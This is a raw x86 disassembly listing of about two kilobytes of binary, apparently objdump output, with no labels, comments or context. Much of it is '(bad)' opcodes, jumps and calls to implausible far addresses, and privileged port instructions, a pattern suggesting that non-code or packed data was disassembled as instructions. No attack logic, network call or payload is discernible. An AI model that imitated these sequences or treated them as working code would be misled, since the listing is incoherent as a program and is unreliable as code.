  41267c:	mov    DWORD PTR [edx+ebx*1-0xf9f5fc],eax
  412683:	jne    0x4126a4
  412685:	add    DWORD PTR [eax+edx*1-0x76fffa0a],0xffffff84
  41268d:	push   cs
  41268e:	add    al,0x0
  412690:	arpl   WORD PTR [edx+eax*8],bx
  412693:	(bad)  
  412694:	in     eax,0x1f
  412696:	(bad)  
  412697:	jmp    esp
  412699:	xor    eax,DWORD PTR [edx]
  41269b:	add    BYTE PTR [ebx-0x4b],ah
  41269e:	or     BYTE PTR [edi],0x5f
  4126a1:	sbb    al,0x2
  4126a3:	mov    esp,ebp
  4126a5:	push   ebx
  4126a6:	(bad)  
  4126a7:	inc    esp
  4126a9:	imul   esp,ebx,0xffffff8a
  4126ac:	in     eax,0x2b
  4126ae:	(bad)  
  4126af:	push   DWORD PTR [ebp+eiz*4+0x23db5f0d]
  4126b6:	aaa    
  4126b7:	test   DWORD PTR [ebx+0x20],edx
  4126ba:	add    al,BYTE PTR [eax]
  4126bc:	cmp    eax,0x74611
	...
  4126cd:	add    BYTE PTR [eax],al
  4126cf:	arpl   WORD PTR [ecx-0x61348cc8],sp
  4126d5:	dec    edx
  4126d6:	(bad)  
  4126d7:	bound  edi,QWORD PTR [edx+0x1c630417]
  4126dd:	test   DWORD PTR [eax+0x6a],ebp
  4126e0:	adc    DWORD PTR [ebx],ebx
  4126e2:	mov    esp,ebp
  4126e4:	sub    edi,esi
  4126e6:	jmp    DWORD PTR [esp+esi*4-0x7f]
  4126ea:	pop    ss
  4126eb:	addr16 push ds
  4126ed:	add    al,BYTE PTR [eax-0x16]
  4126f0:	enter  0x417,0x63
  4126f4:	push   ds
  4126f5:	mov    DWORD PTR [ebp+0x22273],eax
  4126fb:	call   0x634542a8
  412700:	push   ds
  412701:	mov    WORD PTR [edi],cs
  412703:	popa   
  412704:	in     al,dx
  412705:	cmp    ecx,eax
  412707:	fisttp DWORD PTR [esi+0x1]
  41270a:	mov    ?,WORD PTR [edi+0x2a]
  41270d:	add    al,BYTE PTR [eax]
  41270f:	mov    ss,WORD PTR [ebp-0x75]
  412712:	test   DWORD PTR [ebx+0x2a],esi
  412715:	add    al,BYTE PTR [eax]
  412717:	fiadd  DWORD PTR ds:0x5671c6f
  41271d:	jmp    0xf4a112e5
  412722:	(bad)  
  412723:	in     al,dx
  412724:	xor    BYTE PTR [edi-0x7e],bl
  412727:	push   esp
  412728:	or     ecx,ebp
  41272a:	add    ebp,eax
  41272c:	xchg   eax,esp
  41272e:	call   esp
  412730:	xor    BYTE PTR [edx+0x14],ah
	...
  41273f:	add    BYTE PTR [eax],al
  412741:	add    BYTE PTR [ecx+0x53],ah
  412744:	out    dx,al
  412745:	inc    ebp
  412746:	fcom   QWORD PTR ds:0x95889e8
  41274c:	jmp    0x624f5554
  412751:	sbb    DWORD PTR [ecx+ecx*1-0x17],0xe087da03
  412759:	call   FWORD PTR [eax+esi*1+0x11c68b28]
  412760:	in     eax,dx
  412761:	add    esp,DWORD PTR [ebx+0x7e]
  412764:	adc    bx,WORD PTR [edi+0x5]
  412768:	jmp    0xe54f0df9
  41276d:	add    esp,DWORD PTR [ebx+0x7b]
  412770:	loopne 0x412777
  412772:	call   0x9be4:0x8d8ca72f
  412779:	mov    esp,DWORD PTR [ebx+edx*8+0x71]
  41277d:	dec    ecx
  41277e:	cmp    al,0x4e
  412780:	je     0x4127ba
  412782:	dec    ebp
  412783:	jl     0x41272a
  412785:	test   BYTE PTR [ecx+ecx*1],ah
  412788:	mov    ecx,0x2c1d2e8c
  41278d:	aaa    
  41278e:	xor    eax,0xe1486130
  412793:	and    eax,0x3ed9d2ea
  412798:	push   eax
  412799:	js     0x4127b3
  41279b:	xor    BYTE PTR ds:0x5fd84,bh
  4127a1:	sahf   
  4127a2:	fild   WORD PTR [ecx-0x19]
  4127a5:	jne    0x4127a7
	...
  4127b3:	add    BYTE PTR [eax],al
  4127b5:	dec    esp
  4127b6:	das    
  4127b7:	inc    dh
  4127b9:	sbb    dl,cl
  4127bb:	shl    ecx,0x60
  4127be:	test   al,cl
  4127c0:	push   ss
  4127c1:	popa   
  4127c2:	jg     0x4127df
  4127c4:	in     eax,0x60
  4127c6:	add    eax,0xba69908d
  4127cb:	sbb    BYTE PTR [edx-0x1e],dh
  4127ce:	inc    DWORD PTR [ebx]
  4127d0:	jmp    0xd1c6a635
  4127d5:	les    ebp,FWORD PTR [edi]
  4127d7:	(bad)  
  4127d8:	sub    esi,ebp
  4127da:	popa   
  4127db:	sbb    esp,ebp
  4127dd:	pusha  
  4127de:	add    eax,0x9576f89
  4127e3:	add    cl,ch
  4127e5:	(bad)  [ecx+0x560ed17]
  4127eb:	mov    bl,cl
  4127ed:	bound  edx,QWORD PTR [ebx-0x3]
  4127f0:	stos   DWORD PTR es:[edi],eax
  4127f1:	(bad)  
  4127f3:	add    BYTE PTR [edi+0x6b],bl
  4127f6:	or     DWORD PTR [eax],eax
  4127f8:	jmp    0x67cc34b0
  4127fd:	dec    edi
  4127fe:	or     DWORD PTR [eax],eax
  412800:	jmp    0xe558b1e4
  412805:	pusha  
  412806:	add    eax,0xac57040
  41280b:	add    al,0xe9
  41280d:	pusha  
  41280e:	jl     0x412795
  412810:	(bad)  [edi+ebp*1-0x2]
  412814:	(bad)  
  412815:	lds    edx,FWORD PTR [esi]
  412817:	add    al,0xe9
	...
  412825:	add    BYTE PTR [eax],al
  412827:	add    BYTE PTR [eax+0x7b],ah
  41282a:	por    mm2,QWORD PTR [edx+0x5761c130]
  412831:	add    al,0x8e
  412833:	in     eax,dx
  412834:	and    al,0x2f
  412836:	inc    BYTE PTR [eax]
  412838:	fist   WORD PTR [ecx]
  41283a:	mov    eax,DWORD PTR [esi-0x1d0c6]
  412840:	sub    DWORD PTR [edi+0x2fa0416],0x40
  412847:	mov    DWORD PTR [ebp+ecx*1-0x7df5fffc],edx
  41284e:	test   BYTE PTR [eax],dl
  412850:	inc    BYTE PTR [edx]
  412852:	add    BYTE PTR [ebx+0x4117c],cl
  412858:	retf   0xe7c
  41285b:	add    bh,BYTE PTR [eax-0x9]
  41285e:	ror    BYTE PTR [eax+0x1c8e09aa],0xbe
  412865:	add    al,BYTE PTR [eax]
  412867:	jne    0x4128cc
  412869:	jp     0x4127ef
  41286b:	adc    BYTE PTR [esi+0x3c890002],bh
  412871:	or     al,BYTE PTR [eax+eax*1]
  412874:	mov    edx,0x86ae8742
  412879:	cs (bad) 
  41287b:	call   DWORD PTR [ebx]
  41287d:	mov    al,0xe
  41287f:	add    al,0x7a
  412881:	add    cl,BYTE PTR [ebx-0x1d14d7a]
  412887:	(bad)  
  412888:	mov    edx,0x8dff22
	...
  412899:	add    BYTE PTR [eax],al
  41289b:	jbe    0x4128cb
  41289d:	(bad)  
  41289e:	dec    DWORD PTR [edi+0x10]
  4128a1:	mov    eax,DWORD PTR [esi-0x1d196]
  4128a7:	shl    DWORD PTR [eax+0x24a0416],cl
  4128ad:	inc    eax
  4128ae:	mov    DWORD PTR [esi+edx*1-0x7ec5fffc],esp
  4128b5:	test   BYTE PTR [eax],dl
  4128b7:	dec    esi
  4128b8:	add    al,BYTE PTR [eax]
  4128ba:	mov    edi,DWORD PTR [edx+ecx*1+0x1c630004]
  4128c1:	push   edx
  4128c2:	pop    ds
  4128c3:	(bad)  
  4128c4:	into   
  4128c5:	push   ss
  4128c6:	add    al,0x63
  4128c8:	sbb    al,0xaf
  4128ca:	sbb    al,ch
  4128cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128cd:	adc    al,BYTE PTR [ebx+eiz*2]
  4128d0:	sbb    al,0x8b
  4128d2:	test   DWORD PTR [ebx+0x28],ebp
  4128d5:	add    al,BYTE PTR [eax]
  4128d7:	mov    ds:0x5f1b64b5,eax
  4128dc:	sbb    al,0x2
  4128de:	mov    ebp,esp
  4128e0:	sub    edi,esi
  4128e2:	jmp    esp
  4128e4:	mov    ds:0x1c67177c,al
  4128e9:	add    dl,al
  4128eb:	sbb    DWORD PTR ds:0x1c671b84,0x2
  4128f2:	jne    0x41295e
  4128f4:	mov    ds:0x1c670f7c,eax
  4128f9:	add    cl,BYTE PTR [ecx+0x3dd]
	...
  41290b:	add    BYTE PTR [eax],al
  41290d:	add    BYTE PTR [ebx-0x24],ah
  412910:	mov    ch,BYTE PTR [ebp+0x22847]
  412916:	jmp    0x871c:0x6304139d
  41291d:	mov    ch,0x6b
  41291f:	and    BYTE PTR [edx],al
  412921:	add    BYTE PTR [ebx-0x5ea329fb],dh
  412927:	xor    eax,DWORD PTR [edx]
  412929:	mov    ebx,DWORD PTR [edi]
  41292b:	dec    eax
  41292c:	(bad)  
  41292d:	push   ebp
  41292e:	adc    al,0xa3
  412930:	mov    bh,0x23
  412932:	push   ebx
  412933:	mov    ds:0x1ee33c32,eax
  412938:	add    al,BYTE PTR [eax]
  41293a:	ror    BYTE PTR [edx+0x7f],1
  41293d:	(bad)  
  41293e:	addr16 das 
  412940:	or     edi,DWORD PTR [ebx]
  412942:	fld    QWORD PTR [edx-0x2]
  412945:	(bad)  
  412946:	cmp    al,0x6
  412948:	(bad)  
  41294a:	sub    eax,0xe144014e
  41294f:	and    eax,0x45e1d4ee
  412954:	jecxz  0x41292b
  412956:	and    bh,dh
  412958:	call   0xe5230855
  41295d:	add    esp,DWORD PTR [ebx-0x4f]
  412960:	repz test BYTE PTR [ebp+eax*1+0x27003e9],0x6a
  412969:	and    eax,0xf6f82062
  41296e:	in     al,dx
  41296f:	add    ecx,ebp
  412971:	add    eax,DWORD PTR [eax]
	...
  41297f:	add    BYTE PTR [eax],al
  412981:	jno    0x412989
  412983:	sahf   
  412984:	neg    ah
  412986:	test   eax,0x65103e8
  41298b:	scas   al,BYTE PTR es:[edi]
  41298c:	inc    edx
  41298d:	(bad)  
  41298e:	std    
  41298f:	cdq    
  412990:	add    BYTE PTR [ecx+ecx*1],0x99
  412994:	sub    eax,DWORD PTR [esi+0xd34e52f]
  41299a:	sub    BYTE PTR [esi-0xbe26b78],0x39
  4129a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129a2:	sub    al,0x5b
  4129a4:	mov    edi,0xd521ff74
  4129a9:	ss inc edi
  4129ab:	lock add esi,DWORD PTR [ebx*1+0x2c8539e4]
  4129b3:	or     eax,0x4701bc81
  4129b8:	inc    edx
  4129b9:	pop    esp
  4129ba:	add    eax,0xe108893a
  4129bf:	loopne 0x41298f
  4129c1:	push   cs
  4129c2:	adc    BYTE PTR [edi-0x1322e180],0x3
  4129c9:	arpl   WORD PTR ds:0xfe70516,ax
  4129cf:	add    al,ch
  4129d1:	pusha  
  4129d2:	add    eax,0x2be07281
  4129d7:	(bad)  
  4129d8:	jmp    0xddc3eed0
  4129dd:	or     al,0x14
  4129df:	add    al,0xda
  4129e1:	sub    ah,BYTE PTR [esi+esi*1]
  4129e4:	push   edx
	...
  4129f1:	add    BYTE PTR [eax],al
  4129f3:	add    BYTE PTR [edi+0x2b],dl
  4129f6:	mov    dh,BYTE PTR [edi]
  4129f8:	dec    eax
  4129f9:	fdiv   st(2),st
  4129fb:	ds push edi
  4129fd:	jg     0x4129cc
  4129ff:	inc    ecx
  412a00:	dec    edx
  412a01:	cs (bad) 
  412a03:	cs jmp 0xf91:0xea0123c7
  412a0b:	in     eax,0x60
  412a0d:	add    eax,0x504228a
  412a12:	add    ah,BYTE PTR [eax]
  412a14:	bound  eax,QWORD PTR [esi+0x5e]
  412a17:	jno    0x412a7b
  412a19:	sub    al,0x85
  412a1b:	fxch   st(4)
  412a1d:	sub    edi,esi
  412a1f:	pusha  
  412a20:	out    dx,al
  412a21:	out    0x3,eax
  412a23:	jmp    0x429df588
  412a28:	sbb    eax,0x206a0004
  412a2d:	sub    eax,DWORD PTR [eax]
  412a2f:	xchg   edi,eax
  412a30:	push   ebx
  412a31:	add    DWORD PTR [eax],eax
  412a33:	jmp    0x3c49c51b
  412a38:	data16 add BYTE PTR [ebp+0x564d9],0x60
  412a40:	fst    DWORD PTR [ebx]
  412a42:	add    al,0xe9
  412a44:	pusha  
  412a45:	lds    ecx,FWORD PTR [eax+0x15357]
  412a4b:	jmp    0xed50ac3f
  412a50:	pusha  
  412a51:	add    eax,0x16f678b
	...
  412a66:	add    BYTE PTR [edx-0x57],cl
  412a69:	push   es
  412a6a:	add    dl,BYTE PTR [ebx]
  412a6c:	clc    
  412a6d:	mov    edi,0xbe024288
  412a72:	sbb    al,0x46
  412a74:	pop    es
  412a75:	add    BYTE PTR [ebp+0x63],dh
  412a78:	stos   BYTE PTR es:[edi],al
  412a79:	test   BYTE PTR [eax],dl
  412a7b:	inc    esi
  412a7c:	pop    es
  412a7d:	add    BYTE PTR [ecx+0x3f9b4],cl
  412a83:	or     al,BYTE PTR [edi-0x79]
  412a86:	scas   al,BYTE PTR es:[edi]
  412a87:	inc    BYTE PTR [edx]
  412a89:	add    BYTE PTR [eax],al
  412a8b:	xchg   ebx,eax
  412a8c:	jg     0x412a9c
  412a8e:	add    al,0xfa
  412a90:	push   es
  412a91:	mov    eax,DWORD PTR [esi+0x312]
  412a97:	cmp    ah,BYTE PTR [ecx]
  412a99:	mov    ebx,edx
  412a9b:	cmp    ecx,DWORD PTR [ebx]
  412a9d:	pop    es
  412a9e:	cmp    DWORD PTR [eax],0x3
  412aa1:	push   edx
  412aa2:	mov    edi,DWORD PTR [ecx+ecx*1-0x38]
  412aa6:	cli    
  412aa7:	pop    ebp
  412aa8:	test   BYTE PTR [ecx+0x2aa86],0x0
  412aaf:	inc    edx
  412ab0:	stc    
  412ab1:	mov    bh,0x1
  412ab3:	retf   0x6
  412ab6:	add    DWORD PTR [esi+edx*1+0x4],eax
  412aba:	add    BYTE PTR [edx-0x49db6357],bh
  412ac0:	push   es
  412ac1:	add    BYTE PTR [ecx-0x1794f],al
  412ac7:	mov    dh,BYTE PTR [ebx+0x16]
  412aca:	add    DWORD PTR [eax],0x0
	...
  412ad9:	add    BYTE PTR [esi],bl
  412adb:	sbb    eax,0x6a010216
  412ae0:	and    bl,BYTE PTR [eax]
  412ae2:	pop    ebx
  412ae3:	stos   BYTE PTR es:[edi],al
  412ae4:	int3   
  412ae5:	call   0x3f02df
  412aea:	sub    eax,0x635b5b57
  412aef:	pop    esi
  412af0:	cli    
  412af1:	jmp    ebx
  412af3:	xchg   esi,eax
  412af4:	add    al,BYTE PTR ds:0x3b41c63
  412afa:	jp     0x412adc
  412afc:	out    0x17,eax
  412afe:	loop   0x412ab6
  412b00:	add    bh,BYTE PTR [ebp+0x63]
  412b03:	sbb    al,0xb4
  412b05:	add    ecx,DWORD PTR [edx-0x27e819a8]
  412b0b:	push   edi
  412b0c:	out    0x17,al
  412b0e:	xchg   edx,eax
  412b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b10:	inc    eax
  412b11:	out    0x8f,eax
  412b13:	(bad)  
  412b14:	xor    esi,edi
  412b16:	mov    ah,0x62
  412b18:	iret   
  412b19:	pop    edx
  412b1a:	and    DWORD PTR [edx+eax*1],esi
  412b1d:	(bad)  
  412b1e:	fld    QWORD PTR [ebx]
  412b20:	or     BYTE PTR [eax],al
  412b22:	arpl   WORD PTR ds:0x9d630002,bx
  412b28:	sub    eax,0x21c637f
  412b2d:	jae    0x412ac9
  412b2f:	lahf   
  412b30:	scas   al,BYTE PTR es:[edi]
  412b31:	and    edi,DWORD PTR [ebx+0x20]
  412b34:	mov    ch,0x41
  412b36:	cwde   
  412b37:	mov    ds:0x1c6303e6,al
  412b3c:	mov    dh,0x39
	...
  412b4a:	add    BYTE PTR [eax],al
  412b4c:	add    BYTE PTR [ebx-0x4301d3db],bh
  412b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b53:	inc    eax
  412b54:	out    0x60,eax
  412b56:	es xor dh,bh
  412b59:	fcomp  DWORD PTR [ecx+0x1b]
  412b5c:	int3   
  412b5d:	stos   BYTE PTR es:[edi],al
  412b5e:	push   edx
  412b5f:	xor    BYTE PTR [ecx-0x74f3ffd9],cl
  412b65:	in     eax,0x4b
  412b67:	push   es
  412b68:	add    BYTE PTR [ebx-0x4a],ah
  412b6b:	push   esp
  412b6c:	and    esp,DWORD PTR [edx+0x1e]
  412b6f:	push   esp
  412b70:	add    DWORD PTR [ecx+0x74007bfa],esp
  412b76:	add    al,0x6f
  412b78:	adc    al,0x67
  412b7a:	add    eax,0xe0c67ae9
  412b7f:	in     al,dx
  412b80:	add    esp,DWORD PTR [ebx-0x39]
  412b83:	sub    ecx,ebp
  412b85:	and    bh,dh
  412b87:	call   0xe76a4910
  412b8c:	jno    0x412bf6
  412b8e:	add    ecx,ebp
  412b90:	add    ebp,esi
  412b92:	cwde   
  412b93:	fbstp  TBYTE PTR [esi+0x146e7c5b]
  412b99:	addr16 add eax,0xdde7ae9
  412b9f:	in     eax,dx
  412ba0:	add    esp,DWORD PTR [ebx-0x3b]
  412ba3:	pop    edi
  412ba4:	bound  edi,QWORD PTR [eax+0x1]
  412ba7:	jmp    0xd8c105af
  412bac:	pop    es
  412bad:	arpl   WORD PTR ds:0x8a62,ax
	...
  412bbf:	add    BYTE PTR [ecx+eax*1-0x17],dl
  412bc3:	add    ebp,ecx
  412bc5:	adc    eax,0x43ee55eb
  412bca:	jo     0x412be0
  412bcc:	bound  esp,QWORD PTR [edi-0xc]
  412bcf:	pop    es
  412bd0:	arpl   WORD PTR ds:0x7fe80a94,ax
  412bd6:	fadd   DWORD PTR [edi]
  412bd8:	arpl   WORD PTR ds:0x16c8a70,ax
  412bde:	jmp    0x3ebf4ee6
  412be3:	adc    BYTE PTR [edi+0x5],bl
  412be6:	jmp    0xe5571265
  412beb:	add    esp,DWORD PTR [ebx+0x7c]
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	or     esp,DWORD PTR [edi+0x5]
  412bf2:	jmp    0x672da04a
  412bf7:	out    0x60,eax
  412bf9:	add    eax,0x7c12b7e9
  412bfe:	jmp    FWORD PTR [ecx+0x6a072021]
  412c04:	and    BYTE PTR [ebx],al
  412c06:	push   eax
  412c07:	xchg   ecx,eax
  412c08:	retf   0xfe2d
  412c0b:	sahf   
  412c0c:	out    0x79,eax
  412c0e:	paddsw mm4,QWORD PTR [eax+0x5]
  412c12:	mov    al,dh
  412c14:	enter  0x5,0xe9
  412c18:	pusha  
  412c19:	push   es
  412c1a:	xchg   cl,bl
  412c1c:	pop    esp
  412c1d:	add    eax,0xe3d26000
  412c22:	add    ebp,ecx
	...
  412c30:	add    BYTE PTR [eax],al
  412c32:	add    BYTE PTR [eax-0x7a],ah
  412c35:	cli    
  412c36:	imul   esp,DWORD PTR [eax+0x5],0x8458da00
  412c3d:	imul   ecx,DWORD PTR ds:0xb58b036f,0xfffffffc
  412c44:	rsqrtps xmm6,XMMWORD PTR [edx-0x5e]
  412c48:	and    BYTE PTR [ebx+0x40],ah
  412c4b:	push   ebx
  412c4c:	daa    
  412c4d:	pop    esi
  412c4e:	xchg   edi,eax
  412c4f:	sub    eax,0x60e1c1cb
  412c54:	xchg   dl,bh
  412c56:	jmp    0x9b4131c0
  412c5b:	pop    esp
  412c5c:	fiadd  WORD PTR [ebx-0x33]
  412c5f:	push   0x5e9fa86
  412c64:	sub    dh,bh
  412c66:	jnp    0x412c51
  412c68:	fadd   QWORD PTR [ebx-0x3b]
  412c6b:	pop    eax
  412c6c:	jl     0x412cc1
  412c6e:	int    0x68
  412c70:	ror    DWORD PTR [edx-0x712a7e1],cl
  412c76:	out    0x7c,al
  412c78:	(bad)  
  412c79:	pop    ebp
  412c7a:	cmp    al,0x98
  412c7c:	inc    ebp
  412c7d:	pop    es
  412c7e:	jmp    0xe55c93ea
  412c83:	pusha  
  412c84:	add    eax,0xaa830075
  412c89:	test   BYTE PTR [eax],dl
  412c8b:	jle    0x412c90
  412c8d:	add    BYTE PTR [ecx+0x3f90c],cl
  412c93:	mov    al,BYTE PTR [ebx-0x79]
  412c96:	scas   al,BYTE PTR es:[edi]
	...
  412ca3:	add    BYTE PTR [eax],al
  412ca5:	add    BYTE PTR [esi-0x3],ah
  412ca8:	(bad)  
  412ca9:	push   ebx
  412cab:	jle    0x412cbb
  412cad:	add    al,0x4a
  412caf:	add    ecx,DWORD PTR [ebx-0xad7a]
  412cb5:	(bad)  
  412cb6:	jmp    0xffff:0x26bdff21
  412cbd:	(bad)  
  412cbe:	aas    
  412cbf:	cli    
  412cc0:	mov    al,BYTE PTR [esi-0xe6]
  412cc6:	mov    bl,0x7f
  412cc8:	push   ss
  412cc9:	add    al,0x3a
  412ccb:	add    eax,DWORD PTR [eax-0x77]
  412cce:	in     al,0x15
  412cd0:	add    al,0x0
  412cd2:	or     ch,BYTE PTR [edx+0x2fe1084]
  412cd8:	add    BYTE PTR [ebx+0x3f97c],cl
  412cde:	or     dl,bl
  412ce0:	push   ds
  412ce1:	mov    ecx,esi
  412ce3:	push   ds
  412ce4:	push   ss
  412ce5:	push   edx
  412ce6:	jno    0x412ccf
  412ce8:	out    0xd4,al
  412cea:	inc    edx
  412ceb:	(bad)  
  412cec:	std    
  412ced:	pop    edi
  412cee:	adc    al,0x56
  412cf0:	pop    ecx
  412cf1:	ret    0x2c2
  412cf4:	mov    eax,DWORD PTR [esi+ebx*4-0x2]
  412cf8:	mov    WORD PTR [eax-0x7546],ss
  412cfe:	icebp  
  412cff:	xchg   ecx,eax
  412d00:	add    al,BYTE PTR [edx+ecx*8]
  412d03:	add    dh,BYTE PTR [esi+0x19]
  412d06:	xor    DWORD PTR [ecx+0x40a],ebp
	...
  412d18:	add    BYTE PTR [edx+0x63c13b02],bh
  412d1e:	(bad)  
  412d1f:	or     BYTE PTR [ebx],ch
  412d21:	mov    ds:0x3800065a,al
  412d26:	pop    ebp
  412d27:	pop    es
  412d28:	add    bl,bh
  412d2a:	sbb    al,0x2
  412d2c:	ret    0x1c67
  412d2f:	icebp  
  412d30:	mov    edi,0x830220a1
  412d35:	jg     0x412d63
  412d37:	rcl    DWORD PTR [eax+ebx*8-0x8],1
  412d3b:	out    0x1f,eax
  412d3d:	mov    ch,0x4b
  412d3f:	dec    ecx
  412d40:	mov    dl,BYTE PTR [edx-0x11]
  412d43:	jl     0x412da0
  412d45:	xchg   DWORD PTR [ebx+edi*2+0x5b],ecx
  412d49:	jg     0x412d6f
  412d4b:	jmp    0x412cfa
  412d4d:	imul   ebx,DWORD PTR [eax],0x2
  412d50:	add    BYTE PTR [ebx+ebx*4+0x61],ah
  412d54:	jmp    FWORD PTR [esp+ebx*1]
  412d57:	sbb    DWORD PTR [edx],ecx
  412d59:	(bad)  
  412d5a:	jg     0x412d42
  412d5c:	call   FWORD PTR [esp+ebx*1]
  412d5f:	add    cl,BYTE PTR [ebp-0x74fbff81]
  412d65:	in     eax,0x17
  412d67:	push   es
  412d68:	add    BYTE PTR [ebx-0x67],ah
  412d6b:	jp     0x412d6c
  412d6d:	test   BYTE PTR ds:0x6e2b3b02,bl
  412d73:	adc    eax,0x62fdd8b
  412d78:	add    BYTE PTR [ebx+0x23],ah
  412d7b:	inc    ebx
  412d7c:	jne    0x412d7e
	...
  412d8a:	add    BYTE PTR [eax],al
  412d8c:	addr16 inc ebx
  412d8e:	inc    ebx
  412d8f:	jmp    0x9463:0x4434368
  412d96:	add    eax,DWORD PTR [eax]
  412d98:	mov    eax,0xe8bff119
  412d9d:	popf   
  412d9e:	cli    
  412d9f:	add    esp,DWORD PTR [ebx+0x1c]
  412da2:	std    
  412da3:	mov    ch,0x52
  412da5:	add    eax,0x41b75f6
  412daa:	jb     0x412d84
  412dac:	test   BYTE PTR [eax],0x62
  412daf:	add    cl,ch
  412db1:	jns    0x412dc1
  412db3:	jnp    0x412e0d
  412db5:	jle    0x412e28
  412db7:	xchg   BYTE PTR [ecx+eax*1-0x17],bl
  412dbb:	add    ebp,DWORD PTR [edi+ebp*2-0x28]
  412dbf:	cld    
  412dc0:	scas   al,BYTE PTR es:[edi]
  412dc1:	(bad)  
  412dc2:	out    0x78,eax
  412dc4:	sbb    BYTE PTR [edi+0xce78ec],cl
  412dca:	in     eax,0x3
  412dcc:	arpl   WORD PTR [esi+0x71b82fc],cx
  412dd2:	jmp    0x774790da
  412dd7:	or     BYTE PTR [edi+0x5],bl
  412dda:	jmp    0xed4f1ae1
  412ddf:	add    esp,DWORD PTR [ebx-0x70]
  412de2:	data16 or BYTE PTR [edi+0x5],ah
  412de6:	jmp    0x6f324a63
  412deb:	add    BYTE PTR [edi+0x5],ah
  412dee:	jmp    0x412e75
	...
  412dff:	sbb    eax,DWORD PTR [esi]
  412e01:	rol    DWORD PTR [edx],0x63
  412e04:	fwait
  412e05:	in     eax,dx
  412e06:	mov    ebx,0x7ec8bdb
  412e0b:	arpl   WORD PTR ds:0x95c5df0,ax
  412e11:	jmp    0x92c88a19
  412e16:	sub    al,0xe5
  412e18:	and    al,0x71
  412e1a:	enter  0xd580,0x52
  412e1e:	add    al,0x3c
  412e20:	push   es
  412e21:	jmp    0xeedcd10e
  412e26:	jp     0x412e58
  412e28:	jmp    0x88ac46e5
  412e2d:	push   eax
  412e2f:	popa   
  412e30:	adc    al,0x86
  412e32:	and    esp,DWORD PTR [eax+0x5]
  412e35:	add    dh,dh
  412e37:	cs leave 
  412e39:	(bad)  
  412e3a:	in     eax,dx
  412e3b:	push   ss
  412e3c:	rol    DWORD PTR [eax],1
  412e3e:	bound  ebx,QWORD PTR [edx+ecx*4-0x73839dfd]
  412e45:	cmp    al,dl
  412e47:	xchg   DWORD PTR [eax+0x560e8b2],ecx
  412e4d:	mov    esp,DWORD PTR [edi-0x80]
  412e50:	or     BYTE PTR [eax],al
  412e52:	jmp    0xae503644
  412e57:	pushf  
  412e58:	call   0x249a1778
  412e5d:	(bad)  
  412e5e:	rcr    BYTE PTR [ebp+0x623996],cl
	...
  412e70:	add    BYTE PTR [eax],al
  412e72:	jg     0x412e53
  412e74:	cli    
  412e75:	std    
  412e76:	dec    esp
  412e77:	xchg   ecx,eax
  412e78:	xchg   cl,ch
  412e7a:	fadd   DWORD PTR [eax+eax*1]
  412e7d:	mov    dl,0xde
  412e7f:	pop    es
  412e80:	add    al,0xe9
  412e82:	pusha  
  412e83:	fwait
  412e84:	pop    ss
  412e85:	jb     0x412e65
  412e87:	(bad)  
  412e89:	jmp    0xe0390eee
  412e8e:	pop    esp
  412e8f:	lock test DWORD PTR [edx+0xc],0x9f68f7ef
  412e97:	and    al,0x66
  412e99:	call   0xfa425efe
  412e9e:	inc    edi
  412e9f:	pop    DWORD PTR ds:0x8c5bfc62
  412ea5:	in     eax,dx
  412ea6:	out    0xde,eax
  412ea8:	les    ebx,FWORD PTR [edx-0x32ac2268]
  412eae:	mov    ah,0x99
  412eb0:	add    esp,DWORD PTR [eax-0x4c]
  412eb3:	out    0x2b,eax
  412eb5:	add    BYTE PTR [ecx-0x277bf214],ah
  412ebb:	push   es
  412ebc:	add    BYTE PTR [eax],al
  412ebe:	aas    
  412ebf:	(bad)  
  412ec0:	(bad)  
  412ec1:	(bad)  
  412ec2:	mov    edx,0x51cd8b07
  412ec7:	loope  0x412e50
  412ec9:	dec    esp
  412eca:	data16 cmc 
  412ecc:	cmp    cl,BYTE PTR [esi+eiz*2+0x3d]
  412ed0:	or     eax,0xa7087
	...
  412ee5:	adc    DWORD PTR [ebp+0x22],ebx
  412ee8:	adc    al,dh
  412eea:	hlt    
  412eeb:	add    BYTE PTR [edx],bh
  412eed:	push   esi
  412eee:	push   ds
  412eef:	dec    BYTE PTR [edx-0x44eddab2]
  412ef5:	js     0x412efe
  412ef7:	add    BYTE PTR [eax],al
  412ef9:	jbe    0x412f18
  412efb:	cmp    DWORD PTR [esi-0x1dcda],ecx
  412f01:	sub    eax,0x3a00c886
  412f06:	pop    es
  412f07:	mov    edx,DWORD PTR [esi+eiz*1+0x17]
  412f0b:	cmp    edx,ebx
  412f0d:	cmp    DWORD PTR [edx],ebp
  412f0f:	mov    ecx,DWORD PTR [ebp+0x38]
  412f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f13:	out    0x2b,al
  412f15:	push   cs
  412f16:	inc    ebx
  412f17:	es mov al,dh
  412f1a:	sbb    eax,0x560b39fe
  412f1f:	add    al,0x43
  412f21:	mov    ebx,0x4872d833
  412f26:	mov    ds:0xa416244a,al
  412f2b:	push   0x24
  412f2d:	bound  esi,QWORD PTR [edx]
  412f2f:	fmul   DWORD PTR [edi]
  412f31:	xchg   al,ch
  412f33:	(bad)  
  412f34:	(bad)  
  412f35:	cli    
  412f36:	xor    ebx,DWORD PTR [edx+0x24]
  412f39:	ficom  DWORD PTR [ebp+eax*2+0x53]
  412f3d:	arpl   WORD PTR [ebp+0x7d],bx
  412f40:	int    0xbb
  412f42:	mov    esi,0x97c4fe2d
  412f47:	mov    bh,0x23
	...
  412f55:	add    BYTE PTR [eax],al
  412f57:	add    BYTE PTR [ebx-0x69],dl
  412f5a:	iret   
  412f5b:	and    ebx,DWORD PTR [ebx+0x7d]
  412f5e:	aam    0x8a
  412f60:	popf   
  412f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f62:	sbb    esp,edi
  412f64:	les    esp,FWORD PTR [esi]
  412f66:	sub    esi,edi
  412f68:	dec    eax
  412f69:	xor    al,0x7d
  412f6b:	dec    ebx
  412f6c:	aas    
  412f6d:	and    BYTE PTR ds:0x1803cbed,al
  412f73:	ret    
  412f74:	adc    eax,0xf8a1763
  412f79:	or     ah,bl
  412f7b:	sar    BYTE PTR [ecx+0x2e],0x7d
  412f7f:	shl    DWORD PTR [edx-0x5efcf6bc],0x2f
  412f86:	mov    esi,0x4a277323
  412f8b:	jne    0x412fea
